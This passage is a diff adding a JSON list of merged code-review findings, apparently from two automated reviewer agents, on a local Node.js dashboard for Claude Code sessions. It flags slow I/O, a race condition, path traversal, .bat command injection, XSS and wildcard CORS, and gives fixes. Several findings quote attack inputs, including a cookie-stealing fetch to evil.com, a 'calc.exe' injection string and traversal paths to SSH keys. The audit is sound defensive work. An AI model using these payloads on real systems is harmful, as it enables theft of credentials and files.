@@ -1,0 +1,1130 @@
+[
+  {
+    "merged_id": "M-007",
+    "canonical_title": "/api/sessions 和 /api/agents 每次请求都触发全量扫描并清空子 Agent 缓存",
+    "canonical_severity": "P1 CRITICAL",
+    "canonical_description": "`getStatus()`、`getActivity()`、`tokenHeat`、`calcCost()` 的调用模式在三个位置几乎逐字重复：`routes/sessions.js` 的 `/api/sessions` 和 `/api/agents` 处理器、`routes/session.js` 的 `buildSessionDetailResponse`、以及 `watcher.js` 的 `processChanges`。每个位置都有 `s.status = scanner.getStatus(...)`、`s.activity = scanner.getActivity(...)` 等 4-5 行相同代码。未来如果增加新的计算维度（如 token 效率评分），需要修改所有位置。",
+    "category": [
+      "performance",
+      "maintainability"
+    ],
+    "file": "routes/sessions.js",
+    "line_range": [
+      8,
+      40
+    ],
+    "sources": [
+      {
+        "agent": "A",
+        "finding_id": "A-007",
+        "severity": "important",
+        "unified_severity": "P1 CRITICAL",
+        "title": "/api/sessions 和 /api/agents 每次请求都触发全量扫描并清空子 Agent 缓存",
+        "description": "两个最频繁调用的 API 端点每次请求都调用 `scanner.scanSessions(shared.PROJECTS_DIR, [])` 做全目录遍历 + 增量解析，然后 `agents.scanSubAgents(sessions)` 再次遍历子 agent 目录。`scanSubAgents` 内部第一行就是 `shared.subAgentCache.clear()`，意味着前一次请求刚建立的缓存立刻被丢弃。在高频轮询场景下（前端每 3-5 秒刷新一次），这会导致大量重复的目录遍历和文件 stat/read 操作。",
+        "confidence": 0.93,
+        "category": "performance",
+        "rule_reference": "Cache invalidation: separate read path (API) from write path (scanner/watcher)"
+      },
+      {
+        "agent": "A",
+        "finding_id": "A-008",
+        "severity": "nit",
+        "unified_severity": "P2 HIGH",
+        "title": "会话状态/活跃度/热度计算在多个文件中重复实现",
+        "description": "`getStatus()`、`getActivity()`、`tokenHeat`、`calcCost()` 的调用模式在三个位置几乎逐字重复：`routes/sessions.js` 的 `/api/sessions` 和 `/api/agents` 处理器、`routes/session.js` 的 `buildSessionDetailResponse`、以及 `watcher.js` 的 `processChanges`。每个位置都有 `s.status = scanner.getStatus(...)`、`s.activity = scanner.getActivity(...)` 等 4-5 行相同代码。未来如果增加新的计算维度（如 token 效率评分），需要修改所有位置。",
+        "confidence": 0.95,
+        "category": "maintainability",
+        "rule_reference": "DRY: Don't Repeat Yourself — extract repeated computation into a single source of truth"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.94,
+      "consensus_boost": 0.15,
+      "final_confidence": 1.0,
+      "agent_count": 2
+    },
+    "status": "consensus",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 1,
+      "category_conflict": true,
+      "categories": [
+        "performance",
+        "maintainability"
+      ]
+    },
+    "code_snippet_bad": "if (req.url === \"/api/sessions\") {\n  scanner.scanSessions(shared.PROJECTS_DIR, []).then(function(sessions) {\n    agents.scanSubAgents(sessions);",
+    "code_snippet_good": "if (req.url === \"/api/sessions\") {\n  var sessions = [];\n  shared.sessionCache.forEach(function(v) { sessions.push(v); });\n  // 状态实时刷新，但不重新扫描文件",
+    "suggestion": "将会话扫描与 API 请求解耦。`/api/sessions` 不应触发扫描，而是直接返回内存中缓存的会话列表。扫描由 `watcher.js` 的文件变更事件和定时轮询驱动，结果写入缓存。API 端点仅读取缓存并返回。`scanSubAgents` 的 `clear()` 应改为增量更新（新增/更新检测到的 agent，移除已不存在的）。"
+  },
+  {
+    "merged_id": "M-012",
+    "canonical_title": "Path Traversal in Snapshot API allows reading arbitrary .json files outside snapshots directory",
+    "canonical_severity": "P0 BLOCKING",
+    "canonical_description": "snapId is extracted from the URL via decodeURI and directly joined into a file path with path.join(shared.SNAPSHOTS_DIR, snapId + '.json'). An attacker can use ../ sequences (URL-encoded as %2e%2e%2f or %2e%2e/) to traverse outside the snapshots directory and read any .json file on the filesystem. Combined with CORS: *, a malicious website can exfiltrate the user's ~/.claude/settings.json (which likely contains Anthropic API keys). The same traversal exists in the delete endpoint at line 47. Furthermore, the guard at line 20 that checks indexOf('/api/snapshot/delete') can be bypassed via URL-encoding: a URL like /api/snapshot/..%2F..%2Fsettings contains no literal 'delete' substring and passes straight through to the vulnerable read path.",
+    "category": "security",
+    "file": "routes/snapshots.js",
+    "line_range": [
+      21,
+      23
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-001",
+        "severity": "blocking",
+        "unified_severity": "P0 BLOCKING",
+        "title": "Path Traversal in Snapshot API allows reading arbitrary .json files outside snapshots directory",
+        "description": "snapId is extracted from the URL via decodeURI and directly joined into a file path with path.join(shared.SNAPSHOTS_DIR, snapId + '.json'). An attacker can use ../ sequences (URL-encoded as %2e%2e%2f or %2e%2e/) to traverse outside the snapshots directory and read any .json file on the filesystem. Combined with CORS: *, a malicious website can exfiltrate the user's ~/.claude/settings.json (which likely contains Anthropic API keys). The same traversal exists in the delete endpoint at line 47. Furthermore, the guard at line 20 that checks indexOf('/api/snapshot/delete') can be bypassed via URL-encoding: a URL like /api/snapshot/..%2F..%2Fsettings contains no literal 'delete' substring and passes straight through to the vulnerable read path.",
+        "confidence": 0.98,
+        "category": "security",
+        "rule_reference": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.98,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.98,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "security"
+      ]
+    },
+    "code_snippet_bad": "var snapId = decodeURI(req.url.split(\"/api/snapshot/\")[1]);\nvar snapFile = path.join(shared.SNAPSHOTS_DIR, snapId + \".json\");\nif (!fs.existsSync(snapFile)) { ... }",
+    "code_snippet_good": "var snapId = decodeURI(req.url.split(\"/api/snapshot/\")[1]);\nif (!/^[a-zA-Z0-9_\\-]+$/.test(snapId)) {\n  res.writeHead(400); res.end(JSON.stringify({error: \"invalid id\"})); return true;\n}\nvar snapFile = path.join(shared.SNAPSHOTS_DIR, snapId + \".json\");\nvar resolved = path.resolve(snapFile);\nif (!resolved.startsWith(path.resolve(shared.SNAPSHOTS_DIR))) {\n  res.writeHead(403); res.end(JSON.stringify({error: \"forbidden\"})); return true;\n}",
+    "suggestion": "Validate snapId against a whitelist pattern (e.g. /^[a-zA-Z0-9_\\-]+$/). Reject any input containing path separators or parent directory references. Alternatively, resolve the path and verify it stays within SNAPSHOTS_DIR using path.resolve and a startsWith check."
+  },
+  {
+    "merged_id": "M-016",
+    "canonical_title": "Snapshot delete endpoint has same path traversal as read endpoint",
+    "canonical_severity": "P0 BLOCKING",
+    "canonical_description": "The delete handler at line 47 mirrors the path traversal vulnerability described in B-001. The delId parameter extracted from the URL is passed directly to deleteSnapshot which does: fs.unlinkSync(path.join(shared.SNAPSHOTS_DIR, id + '.json')). An attacker can traverse out of the snapshots directory and delete arbitrary .json files. Combined with the CORS misconfiguration (B-004), a malicious website can delete the user's configuration files, session data, or other critical .json files.",
+    "category": "security",
+    "file": "routes/snapshots.js",
+    "line_range": [
+      46,
+      50
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-005",
+        "severity": "blocking",
+        "unified_severity": "P0 BLOCKING",
+        "title": "Snapshot delete endpoint has same path traversal as read endpoint",
+        "description": "The delete handler at line 47 mirrors the path traversal vulnerability described in B-001. The delId parameter extracted from the URL is passed directly to deleteSnapshot which does: fs.unlinkSync(path.join(shared.SNAPSHOTS_DIR, id + '.json')). An attacker can traverse out of the snapshots directory and delete arbitrary .json files. Combined with the CORS misconfiguration (B-004), a malicious website can delete the user's configuration files, session data, or other critical .json files.",
+        "confidence": 0.98,
+        "category": "security",
+        "rule_reference": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.98,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.98,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "security"
+      ]
+    },
+    "code_snippet_bad": "var delId = decodeURI(req.url.split(\"/api/snapshot/delete/\")[1]);\nsnapshot.deleteSnapshot(delId);",
+    "code_snippet_good": "var delId = decodeURI(req.url.split(\"/api/snapshot/delete/\")[1]);\nif (!/^[a-zA-Z0-9_\\-]+$/.test(delId)) {\n  res.writeHead(400); res.end(JSON.stringify({error: \"invalid id\"})); return true;\n}\nsnapshot.deleteSnapshot(delId);",
+    "suggestion": "Apply the same input validation as recommended in B-001: whitelist the snapshot ID format and verify the resolved path stays within SNAPSHOTS_DIR."
+  },
+  {
+    "merged_id": "M-004",
+    "canonical_title": "HTTP 请求处理路径中大量使用同步文件 I/O 阻塞事件循环",
+    "canonical_severity": "P1 CRITICAL",
+    "canonical_description": "多个路由处理器在请求-响应周期内使用 `fs.readFileSync`、`fs.writeFileSync`、`fs.statSync` 等同步 API。在 Node.js 单线程模型中，这些调用会阻塞事件循环，导致所有其他请求（包括 SSE 连接的心跳）被延迟。受影响的路由包括：`/`（读 index.html）、`/import-localstorage`（读 import-data.json）、`/api/create-and-open`（读源会话文件 + 写入新会话文件）、`/api/session/:id`（读会话文件 + 读子 agent 文件）。对于可能达到数百 MB 的会话 JSONL 文件，阻塞时间可能长达数秒。",
+    "category": "performance",
+    "file": "index.js",
+    "line_range": [
+      40,
+      135
+    ],
+    "sources": [
+      {
+        "agent": "A",
+        "finding_id": "A-004",
+        "severity": "important",
+        "unified_severity": "P1 CRITICAL",
+        "title": "HTTP 请求处理路径中大量使用同步文件 I/O 阻塞事件循环",
+        "description": "多个路由处理器在请求-响应周期内使用 `fs.readFileSync`、`fs.writeFileSync`、`fs.statSync` 等同步 API。在 Node.js 单线程模型中，这些调用会阻塞事件循环，导致所有其他请求（包括 SSE 连接的心跳）被延迟。受影响的路由包括：`/`（读 index.html）、`/import-localstorage`（读 import-data.json）、`/api/create-and-open`（读源会话文件 + 写入新会话文件）、`/api/session/:id`（读会话文件 + 读子 agent 文件）。对于可能达到数百 MB 的会话 JSONL 文件，阻塞时间可能长达数秒。",
+        "confidence": 0.97,
+        "category": "performance",
+        "rule_reference": "Node.js best practice: never block the event loop in request handlers"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.97,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.97,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "performance"
+      ]
+    },
+    "suggestion": "将文件 I/O 替换为异步版本：`fs.promises.readFile()`、`fs.promises.writeFile()`。对于 `/api/create-and-open` 这种需要多个文件操作的路径，可以使用 async/await 链式调用。对于 `/api/session/:id` 的尾部读取，可以使用 `fs.createReadStream` 流式处理。"
+  },
+  {
+    "merged_id": "M-014",
+    "canonical_title": "Path Traversal via config parameter allows reading arbitrary files as configuration",
+    "canonical_severity": "P0 BLOCKING",
+    "canonical_description": "The /api/create-and-open endpoint takes a config query parameter and—through spawnWithBat in routes/open.js—uses it to construct a file path: path.join(homeDir, '.claude', configName). Since configName comes from user input with no validation, an attacker can supply ../../Windows/win.ini or ../../.ssh/id_rsa to read arbitrary files. The content of the traversed file is then parsed as JSON and its env/model values are written into a bat file (triggering B-002's command injection as a second-stage payload). This same pattern affects the swapSettingsJson function at line 182 of open.js, where the config file content is written directly to settings.json.",
+    "category": "security",
+    "file": "index.js",
+    "line_range": [
+      95,
+      103
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-003",
+        "severity": "blocking",
+        "unified_severity": "P0 BLOCKING",
+        "title": "Path Traversal via config parameter allows reading arbitrary files as configuration",
+        "description": "The /api/create-and-open endpoint takes a config query parameter and—through spawnWithBat in routes/open.js—uses it to construct a file path: path.join(homeDir, '.claude', configName). Since configName comes from user input with no validation, an attacker can supply ../../Windows/win.ini or ../../.ssh/id_rsa to read arbitrary files. The content of the traversed file is then parsed as JSON and its env/model values are written into a bat file (triggering B-002's command injection as a second-stage payload). This same pattern affects the swapSettingsJson function at line 182 of open.js, where the config file content is written directly to settings.json.",
+        "confidence": 0.97,
+        "category": "security",
+        "rule_reference": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.97,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.97,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "security"
+      ]
+    },
+    "code_snippet_bad": "var configName = urlObj.searchParams.get(\"config\");\nif (!configName) { ... }\nvar settingsPath = path.join(homeDir, \".claude\", configName);",
+    "code_snippet_good": "var configName = urlObj.searchParams.get(\"config\");\nif (!configName || !/^[a-zA-Z0-9_\\-.]+$/.test(configName)) {\n  res.writeHead(400, { \"Content-Type\": \"application/json\" });\n  res.end(JSON.stringify({ ok: false, error: \"invalid config name\" }));\n  return;\n}\nvar configPath = path.join(homeDir, \".claude\", configName);\nif (path.resolve(configPath).indexOf(path.resolve(path.join(homeDir, \".claude\"))) !== 0) {\n  res.writeHead(403); res.end(JSON.stringify({error: \"forbidden\"}));\n  return;\n}",
+    "suggestion": "Validate configName against a strict pattern like /^[a-zA-Z0-9_\\-.]+$/. Resolve the resulting path and verify it stays within the ~/.claude directory before reading. Never pass unsanitized user input to path.join for file operations."
+  },
+  {
+    "merged_id": "M-002",
+    "canonical_title": "settings.json 的 5 秒延迟恢复存在竞态条件",
+    "canonical_severity": "P0 BLOCKING",
+    "canonical_description": "`launchSessionDirect` 先调用 `swapSettingsJson(configFile)` 将 settings.json 替换为目标配置，然后用 `setTimeout(..., 5000)` 恢复到 ORIGINAL_SETTINGS。如果两个会话在 5 秒内先后打开（T=0 打开会话A，T=3 打开会话B），T=5 时会话A的恢复逻辑会将 settings.json 覆盖为 ORIGINAL_SETTINGS，导致会话B（正在运行的 VSCode）丢失其配置。两个定时器互相不知道对方的存在。",
+    "category": "bug",
+    "file": "routes/open.js",
+    "line_range": [
+      170,
+      188
+    ],
+    "sources": [
+      {
+        "agent": "A",
+        "finding_id": "A-002",
+        "severity": "blocking",
+        "unified_severity": "P0 BLOCKING",
+        "title": "settings.json 的 5 秒延迟恢复存在竞态条件",
+        "description": "`launchSessionDirect` 先调用 `swapSettingsJson(configFile)` 将 settings.json 替换为目标配置，然后用 `setTimeout(..., 5000)` 恢复到 ORIGINAL_SETTINGS。如果两个会话在 5 秒内先后打开（T=0 打开会话A，T=3 打开会话B），T=5 时会话A的恢复逻辑会将 settings.json 覆盖为 ORIGINAL_SETTINGS，导致会话B（正在运行的 VSCode）丢失其配置。两个定时器互相不知道对方的存在。",
+        "confidence": 0.95,
+        "category": "bug",
+        "rule_reference": "Race condition in file-based configuration swap"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.95,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.95,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "bug"
+      ]
+    },
+    "code_snippet_bad": "swapSettingsJson(configFile);\nsetTimeout(function() {\n  if (ORIGINAL_SETTINGS && currentSettings !== ORIGINAL_SETTINGS) {\n    fsModule.writeFileSync(defaultSettingsPath, ORIGINAL_SETTINGS, \"utf-8\");\n  }\n}, 5000);",
+    "code_snippet_good": "if (!shared._settingsSwapCount) shared._settingsSwapCount = 0;\nswapSettingsJson(configFile);\nshared._settingsSwapCount++;\nsetTimeout(function() {\n  shared._settingsSwapCount--;\n  if (shared._settingsSwapCount === 0 && ORIGINAL_SETTINGS) {\n    fsModule.writeFileSync(defaultSettingsPath, ORIGINAL_SETTINGS, \"utf-8\");\n  }\n}, 5000);",
+    "suggestion": "使用引用计数或配置栈：每次 swap 时递增计数器，每次 restore 时递减。仅当计数器归零时才真正写回 ORIGINAL_SETTINGS。或者用进程级互斥锁确保同一时间只有一个活跃的 settings swap。"
+  },
+  {
+    "merged_id": "M-013",
+    "canonical_title": "Command Injection via unsanitized environment variables in BAT file generation",
+    "canonical_severity": "P0 BLOCKING",
+    "canonical_description": "The spawnWithBat function reads a JSON config file and writes env var values directly into a .bat file using string concatenation: batLines.push('set ' + k + '=' + cfg.env[k]). On Windows, batch files interpret &, |, &&, ||, and %VAR% as command separators/operators. If an attacker controls the config file content—via the path traversal in B-003 or by any other means—they can inject arbitrary commands. For example, a config with env.ANTHROPIC_MODEL set to 'claude-sonnet&calc.exe' would execute calc.exe when the bat file runs. The ANTHROPIC_MODEL line at line 76 is equally vulnerable.",
+    "category": "security",
+    "file": "routes/open.js",
+    "line_range": [
+      71,
+      98
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-002",
+        "severity": "blocking",
+        "unified_severity": "P0 BLOCKING",
+        "title": "Command Injection via unsanitized environment variables in BAT file generation",
+        "description": "The spawnWithBat function reads a JSON config file and writes env var values directly into a .bat file using string concatenation: batLines.push('set ' + k + '=' + cfg.env[k]). On Windows, batch files interpret &, |, &&, ||, and %VAR% as command separators/operators. If an attacker controls the config file content—via the path traversal in B-003 or by any other means—they can inject arbitrary commands. For example, a config with env.ANTHROPIC_MODEL set to 'claude-sonnet&calc.exe' would execute calc.exe when the bat file runs. The ANTHROPIC_MODEL line at line 76 is equally vulnerable.",
+        "confidence": 0.95,
+        "category": "security",
+        "rule_reference": "CWE-78: Improper Neutralization of Special Elements used in an OS Command"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.95,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.95,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "security"
+      ]
+    },
+    "code_snippet_bad": "if (k.startsWith(\"ANTHROPIC_\") || k.startsWith(\"CLAUDE_\")) {\n  batLines.push(\"set \" + k + \"=\" + cfg.env[k]);\n}",
+    "code_snippet_good": "var SAFE_VALUE_RE = /^[a-zA-Z0-9_\\-.:\\/]+$/;\nif (k.startsWith(\"ANTHROPIC_\") || k.startsWith(\"CLAUDE_\")) {\n  var val = cfg.env[k];\n  if (!SAFE_VALUE_RE.test(val)) {\n    console.error(\"[open] unsafe env value for \" + k + \", skipping\");\n    continue;\n  }\n  var escaped = val.replace(/%/g, \"%%\").replace(/&/g, \"^&\").replace(/\\|/g, \"^|\");\n  batLines.push(\"set \" + k + \"=\" + escaped);\n}",
+    "suggestion": "Never construct batch files via string concatenation with user-controlled data. Use child_process.spawn directly with an explicit argument array (which bypasses shell interpretation), or at minimum validate all env values against a strict allowlist pattern (e.g. /^[a-zA-Z0-9_\\-.:\\/]+$/). For the bat file approach, wrap values in quotes and escape special characters: replace % with %%, & with ^&, | with ^|, etc. Better yet, switch to child_process.execFile or spawn with the env option to avoid the bat file entirely."
+  },
+  {
+    "merged_id": "M-008",
+    "canonical_title": "buildRelationsResponse 同步读取并全量解析父会话文件，可能阻塞数秒",
+    "canonical_severity": "P1 CRITICAL",
+    "canonical_description": "`buildRelationsResponse` 使用 `fs.readFileSync(relTarget._file, 'utf-8')` 将整个父会话 JSONL 文件读入内存，然后逐行解析全部内容两次（第一次匹配 dispatch 事件，第二次构建 waterfall trace）。对于大型会话文件（可达 100-500MB），同步读取会阻塞事件循环数秒。两次全量解析也是不必要的：dispatch 事件匹配和 waterfall trace 可以在一次遍历中完成。",
+    "category": "performance",
+    "file": "routes/session.js",
+    "line_range": [
+      90,
+      200
+    ],
+    "sources": [
+      {
+        "agent": "A",
+        "finding_id": "A-009",
+        "severity": "important",
+        "unified_severity": "P1 CRITICAL",
+        "title": "buildRelationsResponse 同步读取并全量解析父会话文件，可能阻塞数秒",
+        "description": "`buildRelationsResponse` 使用 `fs.readFileSync(relTarget._file, 'utf-8')` 将整个父会话 JSONL 文件读入内存，然后逐行解析全部内容两次（第一次匹配 dispatch 事件，第二次构建 waterfall trace）。对于大型会话文件（可达 100-500MB），同步读取会阻塞事件循环数秒。两次全量解析也是不必要的：dispatch 事件匹配和 waterfall trace 可以在一次遍历中完成。",
+        "confidence": 0.94,
+        "category": "performance",
+        "rule_reference": "Node.js: never sync-read large files in the request path"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.94,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.94,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "performance"
+      ]
+    },
+    "suggestion": "将文件读取改为流式处理（`fs.createReadStream` + readline），在单次遍历中同时收集 dispatch 事件和构建 waterfall spans。如果必须全量加载，使用 `fs.promises.readFile` 并 `await`，避免阻塞。设置合理的行数上限（如 10000 行），超过时截断并返回提示。"
+  },
+  {
+    "merged_id": "M-001",
+    "canonical_title": "import-localstorage 路由存在存储型 XSS 注入风险",
+    "canonical_severity": "P1 CRITICAL",
+    "canonical_description": "`importData`（import-data.json 的原始内容）通过字符串拼接直接嵌入 `<script>` 标签体内：`var d=' + importData + ';`。若 JSON 文件被篡改为包含恶意 payload，如 `{\"key\":\"value\"};fetch('https://evil.com?c='+document.cookie);//}`，会在浏览器中执行任意 JavaScript。虽然利用需要服务器文件系统写入权限，但此模式违反了纵深防御原则，且 `<script>` 内嵌 JSON 本身就是危险的反模式。",
+    "category": "security",
+    "file": "index.js",
+    "line_range": [
+      40,
+      56
+    ],
+    "sources": [
+      {
+        "agent": "A",
+        "finding_id": "A-001",
+        "severity": "important",
+        "unified_severity": "P1 CRITICAL",
+        "title": "import-localstorage 路由存在存储型 XSS 注入风险",
+        "description": "`importData`（import-data.json 的原始内容）通过字符串拼接直接嵌入 `<script>` 标签体内：`var d=' + importData + ';`。若 JSON 文件被篡改为包含恶意 payload，如 `{\"key\":\"value\"};fetch('https://evil.com?c='+document.cookie);//}`，会在浏览器中执行任意 JavaScript。虽然利用需要服务器文件系统写入权限，但此模式违反了纵深防御原则，且 `<script>` 内嵌 JSON 本身就是危险的反模式。",
+        "confidence": 0.92,
+        "category": "security",
+        "rule_reference": "OWASP: Stored XSS Prevention; CWE-79"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.92,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.92,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "security"
+      ]
+    },
+    "code_snippet_bad": "var importData = fs.readFileSync(importFile, \"utf8\");\nvar html = '...<script>!function(){var d=' + importData + ';...';\nres.end(html);",
+    "code_snippet_good": "var importData = fs.readFileSync(importFile, \"utf8\");\ntry { JSON.parse(importData); } catch(e) { res.writeHead(400); res.end(\"Invalid JSON\"); return; }\nvar html = '...<script>!function(){var d=' + JSON.stringify(importData) + ';...';\nres.end(html);",
+    "suggestion": "不要用字符串拼接生成内联脚本。改用服务端渲染将数据注入为 JSON 并设置 Content-Type，或通过单独的 API 端点返回 JSON 后由前端 fetch。最小改动方案：在服务端对 importData 做 JSON.parse 校验后，用 JSON.stringify 重新序列化后再拼接，确保不会注入可执行代码。"
+  },
+  {
+    "merged_id": "M-015",
+    "canonical_title": "CORS: Access-Control-Allow-Origin: * combined with no CSRF protection enables cross-origin data exfiltration",
+    "canonical_severity": "P0 BLOCKING",
+    "canonical_description": "The server sets Access-Control-Allow-Origin: * on every response and has zero CSRF protection. All state-changing endpoints use GET requests (no method restriction). A malicious website can make fetch() requests to localhost:5022, and the browser will allow reading the response due to the wildcard CORS header. The attack chain: (1) user visits attacker.com, (2) attacker.com JS fetches /api/snapshot/../../settings via B-001's path traversal, (3) the response containing Anthropic API keys is readable by attacker.com, (4) attacker exfiltrates the keys. Additionally, attacker.com can trigger /api/create-and-open, /api/snapshot/delete/*, and /api/open-session/* endpoints to manipulate the user's local state.",
+    "category": "security",
+    "file": "index.js",
+    "line_range": [
+      22,
+      24
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-004",
+        "severity": "blocking",
+        "unified_severity": "P0 BLOCKING",
+        "title": "CORS: Access-Control-Allow-Origin: * combined with no CSRF protection enables cross-origin data exfiltration",
+        "description": "The server sets Access-Control-Allow-Origin: * on every response and has zero CSRF protection. All state-changing endpoints use GET requests (no method restriction). A malicious website can make fetch() requests to localhost:5022, and the browser will allow reading the response due to the wildcard CORS header. The attack chain: (1) user visits attacker.com, (2) attacker.com JS fetches /api/snapshot/../../settings via B-001's path traversal, (3) the response containing Anthropic API keys is readable by attacker.com, (4) attacker exfiltrates the keys. Additionally, attacker.com can trigger /api/create-and-open, /api/snapshot/delete/*, and /api/open-session/* endpoints to manipulate the user's local state.",
+        "confidence": 0.92,
+        "category": "security",
+        "rule_reference": "CWE-942: Permissive Cross-domain Policy with Untrusted Domains / CWE-352: Cross-Site Request Forgery"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.92,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.92,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "security"
+      ]
+    },
+    "code_snippet_bad": "res.setHeader(\"Access-Control-Allow-Origin\", \"*\");",
+    "code_snippet_good": "// Remove CORS header entirely when serving from same origin\n// If external access is needed, use a specific origin:\n// res.setHeader(\"Access-Control-Allow-Origin\", \"http://localhost:5022\");\n// And add CSRF tokens for state-changing endpoints",
+    "suggestion": "Since this is a localhost-only tool, consider removing CORS entirely (browsers allow same-origin localhost requests without CORS) and serving the dashboard HTML from the same origin. If CORS must be kept, restrict to specific origins (not *). Add CSRF protection: require a custom header (X-Requested-With) for state-changing operations, or switch mutating endpoints from GET to POST/PUT/DELETE and validate Origin/Referer headers. Consider binding to 127.0.0.1 explicitly instead of 0.0.0.0."
+  },
+  {
+    "merged_id": "M-020",
+    "canonical_title": "import-data.json content is injected directly into inline <script> — no escaping",
+    "canonical_severity": "P1 CRITICAL",
+    "canonical_description": "The /import-localstorage endpoint reads import-data.json and embeds it directly into an HTML <script> tag via string concatenation: 'var d=' + importData + ';'. If importData contains </script>, it would break out of the script tag and allow HTML injection. While this file is local, if an attacker gains write access to the server directory (e.g., via another vulnerability), they could plant a malicious import-data.json that executes arbitrary JavaScript in the context of localhost:5022, accessing localStorage data including API keys stored by the CC Panel.",
+    "category": "security",
+    "file": "index.js",
+    "line_range": [
+      29,
+      41
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-009",
+        "severity": "important",
+        "unified_severity": "P1 CRITICAL",
+        "title": "import-data.json content is injected directly into inline <script> — no escaping",
+        "description": "The /import-localstorage endpoint reads import-data.json and embeds it directly into an HTML <script> tag via string concatenation: 'var d=' + importData + ';'. If importData contains </script>, it would break out of the script tag and allow HTML injection. While this file is local, if an attacker gains write access to the server directory (e.g., via another vulnerability), they could plant a malicious import-data.json that executes arbitrary JavaScript in the context of localhost:5022, accessing localStorage data including API keys stored by the CC Panel.",
+        "confidence": 0.82,
+        "category": "security",
+        "rule_reference": "CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)"
+      },
+      {
+        "agent": "B",
+        "finding_id": "B-014",
+        "severity": "nit",
+        "unified_severity": "P2 HIGH",
+        "title": "import-data.json: missing Content-Type charset may enable encoding-based XSS",
+        "description": "The /import-localstorage endpoint returns Content-Type: text/html; charset=utf-8, which is fine, but the importData is read as utf-8 and embedded directly into a <script> tag without any escaping. If the import-data.json file is somehow encoded differently or contains UTF-7 content (historical IE vector), it could lead to script execution. Low risk on modern browsers but worth hardening.",
+        "confidence": 0.7,
+        "category": "security",
+        "rule_reference": "CWE-116: Improper Encoding or Escaping of Output"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.76,
+      "consensus_boost": 0.15,
+      "final_confidence": 0.91,
+      "agent_count": 2
+    },
+    "status": "consensus",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 1,
+      "category_conflict": false,
+      "categories": [
+        "security"
+      ]
+    },
+    "code_snippet_bad": "var html = '<!DOCTYPE html>...<script>!function(){var d=' + importData + ';...",
+    "code_snippet_good": "var parsed = JSON.parse(importData);\nvar safeData = JSON.stringify(parsed);\nvar html = '<!DOCTYPE html>...<script>!function(){var d=' + safeData + ';...",
+    "suggestion": "JSON-stringify the import data for safe embedding: use JSON.stringify(JSON.parse(importData)) to ensure it's valid JSON and safely encoded. Use a CSP header to mitigate XSS risk. Alternatively, serve the import data via a separate API endpoint instead of embedding it inline."
+  },
+  {
+    "merged_id": "M-005",
+    "canonical_title": "parseSubAgent 未追踪 _ctok (cache read tokens)，导致子 Agent 成本计算偏低",
+    "canonical_severity": "P2 HIGH",
+    "canonical_description": "`parseSubAgent` 在解析 assistant 消息的 usage 时，只累加了 `_itok` (input_tokens) 和 `_otok` (output_tokens)，完全忽略了 `cache_read_input_tokens`。而 `pricing.calcCost` 使用 `_ctok` 来计算缓存读取费用。这导致所有子 Agent 的缓存读取成本被计为 0，成本估算偏保守（实际成本更高）。虽然影响较小，但数据不完整。",
+    "category": "bug",
+    "file": "agents.js",
+    "line_range": [
+      65,
+      80
+    ],
+    "sources": [
+      {
+        "agent": "A",
+        "finding_id": "A-005",
+        "severity": "nit",
+        "unified_severity": "P2 HIGH",
+        "title": "parseSubAgent 未追踪 _ctok (cache read tokens)，导致子 Agent 成本计算偏低",
